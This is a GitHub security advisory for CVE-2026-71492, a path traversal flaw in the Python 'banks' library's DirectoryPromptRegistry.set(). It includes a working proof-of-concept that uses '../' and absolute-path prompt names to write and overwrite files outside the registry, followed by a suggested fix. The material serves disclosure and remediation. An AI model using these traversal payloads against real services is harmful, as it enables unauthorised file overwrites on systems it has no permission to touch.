# [M] Banks: Path traversal in `DirectoryPromptRegistry.set()` allows arbitrary file write outside the registry root

## Summary
Severity: Medium
Advisory: GHSA-x8wg-4xgc-vr54
CVE: CVE-2026-71492
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-09-02
Source: https://github.com/advisories/GHSA-x8wg-4xgc-vr54
Type: github-advisory

## Affected
- PyPI: `banks` — affected >=0 <2.4.5

## Details
## Summary

`DirectoryPromptRegistry.set()` interpolates the attacker-controllable `Prompt.name` into a `Path` expression with no canonicalization. An application that derives the prompt name from request data lets a caller write attacker-controlled bytes outside the configured registry directory.

## Details

`src/banks/registries/directory.py:44`

```python
prompt_file = path / f"{prompt.name}.{prompt.version}.jinja"
prompt_file.write_text(prompt.raw)
```

Two failure modes:

1. **Relative traversal.** `name="../victim/foo"` resolves to `<registry>/../victim/foo.0.jinja` — outside the configured root.
2. **Absolute-path bypass.** `pathlib` documents that `Path("/a") / Path("/b")` returns `Path("/b")`. So `name="/abs/path"` discards the registry root entirely; the registry is never consulted.

The poisoned `name` is then persisted to `index.json`, so the out-of-root path keeps reconstructing on later `_load()` calls (`directory.py:135-141`). With `overwrite=True`, existing files at the target path are replaced.

## Proof of Concept

```python
import tempfile
from pathlib import Path
from banks import Prompt
from banks.registries import DirectoryPromptRegistry

work = Path(tempfile.mkdtemp())
registry = work / "registry"; registry.mkdir()
victim   = work / "victim";   victim.mkdir()

reg = DirectoryPromptRegistry(str(registry))

# (1) Relative traversal
reg.set(prompt=Prompt("pwn", name="../victim/pwned", version="0"))
print((victim / "pwned.0.jinja").read_text())            # 'pwn'

# (2) Absolute-path bypass — registry root is silently discarded
target = victim / "absolute_pwn"
reg.set(prompt=Prompt("abs pwn", name=str(target), version="0"))
print((victim / "absolute_pwn.0.jinja").read_text())     # 'abs pwn'

# (3) Clobber an existing file
existing = victim / "clobber_me"
existing.write_text("ORIGINAL\n")
reg.set(prompt=Prompt("CLOBBERED", name=str(existing), version="0"),
        overwrite=True)
print((victim / "clobber_me.0.jinja").read_text())       # 'CLOBBERED'
```

**Output (verified on `banks==2.4.2`):**

```
pwn
abs pwn
CLOBBERED
```

[test_sandbox_baseline.py](https://github.com/user-attachments/files/27572665/test_sandbox_baseline.py)

<img width="793" height="149" alt="Screenshot 2026-05-10 at 3 19 49 PM" src="https://github.com/user-attachments/assets/5c8a79ba-eaf8-4425-8612-4414bc34a0d6" />

[registry_path_traversal.py](https://github.com/user-attachments/files/27572619/registry_path_traversal.py)

<img width="893" height="221" alt="Screenshot 2026-05-10 at 3 20 02 PM" src="https://github.com/user-attachments/assets/8aceca27-5df1-4b59-9a77-502698da6e65" />


[registry_path_traversal_v2.py](https://github.com/user-attachments/files/27572620/registry_path_traversal_v2.py)

<img width="1036" height="272" alt="Screenshot 2026-05-10 at 3 20 18 PM" src="https://github.com/user-attachments/assets/aaceec31-f9a8-432f-b013-29694dd22478" />


**Negative control:** with a benign `name="okay-name"`, the file lands inside `<registry>/` and the victim directory remains untouched.

## Impact

Arbitrary file write at an attacker-chosen path with attacker-controlled bytes, scoped to whatever the application process can write to. The `.0.jinja` suffix limits some chains, but does not prevent overwriting templates consumed by the same or another application, planting files that other tooling ingests, or clobbering predictable-path config artifacts.

Realistic threat model: any "prompt management" service that exposes prompt creation through an authenticated API and forwards user-supplied `name` (and `version`) to `Prompt(...)` plus `DirectoryPromptRegistry.set()`.

## Suggested Fix

Reject obviously dangerous names early and verify the resulting path stays under the registry root after canonicalization:

```python
# src/banks/registries/directory.py
import re

_NAME_RE = re.compile(r"[A-Za-z0-9._-]+")

@classmethod
def from_prompt_path(cls, prompt, path):
    if not _NAME_RE.fullmatch(prompt.name or ""):
        raise InvalidPromptError(f"Invalid prompt name: {prompt.name!r}")
    if not _NAME_RE.fullmatch(prompt.version or ""):
        raise InvalidPromptError(f"Invalid prompt version: {prompt.version!r}")

    candidate = (path / f"{prompt.name}.{prompt.version}.jinja").resolve()
    if candidate.parent != path.resolve():
        raise InvalidPromptError(
            f"Prompt path escapes registry root: {candidate}"
        )

    candidate.write_text(prompt.raw)
    return cls(
        text=prompt.raw, name=prompt.name, version=prompt.version,
        metadata=prompt.metadata, path=candidate,
    )
```

The same enforcement should run inside `_load()` and `_get_prompt_file()` so a poisoned `index.json` from a vulnerable run cannot keep escaping after upgrade.

## References
- https://github.com/masci/banks/security/advisories/GHSA-x8wg-4xgc-vr54
- https://nvd.nist.gov/vuln/detail/CVE-2026-71492
- https://github.com/masci/banks/pull/77
- https://github.com/masci/banks/commit/a215f6d779966945c56e0af5abed1ae5916fd9d3
- https://github.com/masci/banks
- https://github.com/masci/banks/releases/tag/v2.4.5
